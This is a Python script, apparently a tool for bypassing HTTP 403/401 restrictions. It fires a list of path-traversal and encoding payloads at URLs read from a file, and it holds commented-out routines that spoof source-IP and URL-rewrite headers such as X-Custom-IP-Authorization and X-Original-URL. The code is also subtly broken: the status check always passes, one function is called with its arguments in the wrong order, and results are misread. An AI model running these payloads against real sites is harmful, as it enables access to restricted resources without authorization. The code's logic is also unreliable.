#!/usr/bin/python3

from concurrent.futures import ThreadPoolExecutor
from queue import Queue
import requests
from urllib.parse import urlparse, parse_qs, urlencode
import urllib
import hashlib
import threading
import optparse


# test payloads
# test headers
# test method

class rqt :
    def __init__(self, url, cookies=None) :
        self.bypass_result = {}
        self.url = url
        self.param = urlparse(url)
        self.host = "{}://{}".format(self.param[0], self.param[1])
        self.path = self.param[2]
        self.cookies = cookies
        self.size = ""
        self.status = ""

    def set_state(self) :
        try :
            res = requests.get(self.url, allow_redirects=False, cookies=self.cookies)
            self.status = res.status_code
            self.size = len(res.content)
            print(self.size, ":", self.status)
        except :
            print("error")

    def is_valide(self) :
        if self.status != 403 or self.status != 401 :
            return True
        else :
            return False


def bypass(url, queue) :
    url_object = rqt(url)
    url_object.set_state()
    if url_object.is_valide() == True :
        payload(url_object)
        queue.put(url_object)

def sey_result(queue,stop_event,url_obj) :
    while not stop_event.is_set() :
        # url_object= queue.get()
        print(queue.get())

def payload(url_object):
    param = urlparse(url_object.url)
    host = "{}://{}".format(param[0], param[1])
    paylods = [".",
               "./",
               ".././",
               "*",
               "..;/",
               ";/",
               "%20",
               "%2e",
               "~",
               "%09",
               "/.",
               "/./",
               "/*",
               "..;/",
               ";/",
               "/%20",
               "/%2e",
               "/~",
               "/%09",
               ".json",
               "\\..\\.",
               "\\..\\.\\",
               "..%00/",
               "..%0d/",
               "..%5c",
               "..\\",
               "..%ff\\",
               "..%ff/",
               "%3f",
               "%26",
               "%23",
               "#",
               "?",
               "??",
               "?anything"
               ]
    q = Queue()
    stop_ev = threading.Event()
    t = threading.Thread(target=done, args=(q, stop_ev), daemon=True)
    t.start()
        # payload
    with ThreadPoolExecutor(max_workers=10) as executor :
        for payload in paylods :
            p = "{}{}".format(url_object.path, payload)
            u = "{}{}?{}".format(host, p, param[4])
            print(payload)
            executor.submit(inspect, q,url_object,payload,u)
            # url_object.bypass_result[payload] = inspect(u)
    stop_ev.set()
    print("done")
        # for payload in paylods :
        #     p = "{}/{}".format(url_object.path, payload)
        #     u = "{}{}?{}".format(host, p, param[4])
        #     payload = "/{}".format(payload)
        #     url_object.bypass_result[payload] = inspect(u)

# def headers(url_object):
#         param = urlparse(url_object.url)
#         host = "{}://{}".format(param[0], param[1])
#         headers = {
#             'Real-Ip' : '127.0.0.1',
#             'Referer' : '127.0.0.1',
#             'X-Http-Host-Override' : '127.0.0.1',
#             'X-Original-Remote-Addr' : '127.0.0.1',
#             'X-Real-Ip' : '127.0.0.1',
#             'X-Remote-Addr' : '127.0.0.1',
#             'Base-host' : '127.0.0.1',
#             'Http-host' : '127.0.0.1',
#             'Proxy-host' : '127.0.0.1',
#             'Redirect' : '127.0.0.1',
#             'Referrer' : '127.0.0.1',
#             'Request-Uri' : '127.0.0.1',
#             'Uri' : '127.0.0.1',
#             'host' : '127.0.0.1',
#             'X-Http-Destinationhost' : '127.0.0.1',
#             'X-Original-host' : '127.0.0.1',
#             'X-Proxy-host' : '127.0.0.1',
#             'X-Rewrite-host' : '127.0.0.1',
#             'X-Originating-IP' : '127.0.0.1',
#             'X-Remote-IP' : '127.0.0.1',
#             'X-Client-IP' : '127.0.0.1',
#             'X-Custom-IP-Authorization' : '127.0.0.1',
#         }
#
#         # headers
#         path = param[2]
#         for header in headers :
#             url_object.bypass_result[header] = inspect(url_object.url, {header : headers[header]})
#
# def path_headers(url_object):
#         param = urlparse(url_object.url)
#         host = "{}://{}".format(param[0], param[1])
#         path_headers = {
#             'X-Original-URL' : url_object.path,
#             'X-Rewrite-URL:' : url_object.path,
#         }
#         for header in path_headers :
#             url_object.bypass_result[header] = inspect(host, {header : path_headers[header]})
# #
# def change_methode(url_object):
#         param = urlparse(url_object.url)
#         host = "{}://{}".format(param[0], param[1])
#         # change methode to post
#         try :
#             response = requests.post(url_object.url, {'Content-Length ' : 0})
#             url_object.bypass_result["post"] = "{}:{}".format(response.status_code, len(response.content))
#         except :
#             url_object.bypass_result["post"] = "0:0"

    #     queue.put(url_object)
    #     print("done")
    # else :
    #     print("this urls can't be bypassed


def inspect(url_object,queue,payload,url,headers=None,cookies=None) :
    try :
        a={}
        # print("{} :{} {} {}".format(headers,'\033[31m',url,'\033[0m'))
        response = requests.get(url, allow_redirects=False, headers=headers, cookies=cookies, timeout=5)
        status = response.status_code
        size = len(response.content)
        a[payload]="{}:{}".format(status, size)
        queue.put(a)
    except :
        print("error in ispect element :{}".format(payload))

def done(queue, stop_event) :
    RED = '\033[31m'
    GREEN = '\033[32m'
    RESET = '\033[0m'
    while not stop_event.is_set() :
        url_object = queue.get()

        print(url_object.bypass_result)
        for rslt in url_object.bypass_result :
            print(rslt)
            size = rslt.split(":")[0]
            status = rslt.split(":")[1]
            if status != url_object.status or size != url_object.size :
                print(rslt)
            # else:
            #     print("none")
            # print(url_object.bypass_result[])


def pool(filename, threads, cookies=None) :
    print(
        "urls_path=\033[33m{}\033[0m         threads=\033[33m{}\033[0m  cookies={} ".format(filename, threads, cookies))
    queue = Queue()
    stop_event = threading.Event()
    t = threading.Thread(target=done, args=(queue, stop_event), daemon=True)
    t.start()
    Lines = open(filename, 'r').readlines()
    with ThreadPoolExecutor(max_workers=threads) as executor :
        for i in Lines :
            url = i.replace("\n", "")
            # print(url)
            executor.submit(bypass, url, queue)
    stop_event.set()


def cookie_it(cook) :
    cookies = dict()
    for i in cook.split(";") :
        cookies[i.split("=")[0]] = i.split("=")[1]
    return cookies


def Main() :
    parser = optparse.OptionParser(" help: " + \
                                   "bypass.py -f <url_fielname>  -t <threads_number> --cookie <cookies>")
    # parser.add_option("-u",dest="url",type="string",help="spicify  url")
    parser.add_option("-f", dest="filename", type="string", help="spicify file of urls")
    parser.add_option("-t", dest="threads", type="int", help="spicify nybmer of threads")
    parser.add_option("--cookie", dest="cookie", type="string", help="spicify cookies")

    (options, args) = parser.parse_args()

    threads = 10
    cookies = None
    if (options.filename != None) :
        filename = options.filename
        if (options.threads != None) :
            threads = options.threads
        if (options.cookie != None) :
            cookies = cookie_it(options.cookie)
    else :
        print(parser.usage)
        exit(1)

    pool(filename, threads, cookies)


if __name__ == '__main__' :
    Main()
